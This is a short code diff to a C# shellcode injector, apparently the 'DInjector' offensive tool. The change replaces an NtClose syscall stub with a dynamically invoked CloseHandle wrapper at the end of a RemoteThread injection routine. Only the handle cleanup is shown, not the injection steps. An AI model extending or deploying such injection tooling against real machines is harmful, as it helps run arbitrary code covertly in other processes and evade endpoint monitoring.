@@ -54,7 +54,7 @@ namespace DInjector
             IntPtr attributeList);
 
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
-        delegate DI.Data.Native.NTSTATUS NtClose(IntPtr hObject);
+        delegate bool CloseHandle(IntPtr hObject);
 
         [StructLayout(LayoutKind.Sequential, Pack = 0)]
         struct OBJECT_ATTRIBUTES
@@ -72,6 +72,12 @@ namespace DInjector
         {
             public IntPtr UniqueProcess;
             public IntPtr UniqueThread;
+        }
+
+        private static void closeHandle(IntPtr hObject)
+        {
+            object[] parameters = { hObject };
+            _ = (bool)DI.DynamicInvoke.Generic.DynamicAPIInvoke("kernel32.dll", "CloseHandle", typeof(CloseHandle), ref parameters);
         }
 
         public static void Execute(byte[] shellcodeBytes, int processID)
@@ -198,19 +204,8 @@ namespace DInjector
 
             #endregion
 
-            #region NtClose (hProcess)
-
-            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtClose");
-            NtClose sysNtClose = (NtClose)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtClose));
-
-            sysNtClose(hProcess);
-
-            if (ntstatus == 0)
-                Console.WriteLine("(RemoteThread) [+] NtClose, hProcess");
-            else
-                Console.WriteLine($"(RemoteThread) [-] NtClose, hProcess: {ntstatus}");
-
-            #endregion
+            closeHandle(hThread);
+            closeHandle(hProcess);
         }
     }
 }
